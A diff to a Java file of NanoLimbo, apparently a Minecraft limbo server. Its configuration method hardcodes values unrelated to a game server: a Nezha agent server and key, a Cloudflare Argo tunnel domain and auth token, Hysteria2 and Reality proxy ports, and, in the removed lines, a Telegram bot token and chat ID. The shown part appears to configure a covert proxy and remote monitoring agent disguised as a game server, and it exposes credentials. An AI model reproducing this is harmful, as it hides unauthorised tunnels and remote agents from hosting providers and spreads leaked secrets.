@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "505bc7c0-8f2a-44f7-bdf4-8e37a8f2e896");
+        envVars.put("UUID", "20cf901f-0b3d-4519-9848-1dd2cdcc5d32");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "mIbQsu8GO7pjB0M2hD");
+        envVars.put("NEZHA_KEY", "3YyfdvnXjJxXE6C3hK");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "overnode-sg.doraemon.de5.net");
-        envVars.put("ARGO_AUTH", "eyJhIjoiYTg2NTc2M2YxOGEwOTZhOWI3MWRiZmMxYzJkYzRlYTYiLCJ0IjoiY2ZkMzNmM2QtNDBhZi00NGEyLTk5YjEtYjc4MTkzMmI2YjVkIiwicyI6Ik5qazVNR0V3WW1RdE9EWTJNUzAwWkdNd0xUZ3hZV0V0WldFd016bG1aRGM1T1RVeSJ9");
-        envVars.put("HY2_PORT", "25580");
+        envVars.put("ARGO_DOMAIN", "berryhost-uk-guog.xx66.nyc.mn");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYTg2NTc2M2YxOGEwOTZhOWI3MWRiZmMxYzJkYzRlYTYiLCJ0IjoiNGI0MzM2YmItNzVkMi00M2YxLTk5ZmQtMDFhYTIxZDkyNDkyIiwicyI6Ik5UZGhPREkyTVRndE5XVXhaUzAwWVdZMkxUaGhNRFF0WW1abFpEUTBOMlUxTmpObSJ9");
+        envVars.put("HY2_PORT", "10173");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "25580");
+        envVars.put("REALITY_PORT", "10173");
         envVars.put("S5_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "453472010");
-        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "overnode-sg");
+        envVars.put("NAME", "berryhost-uk-guog");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
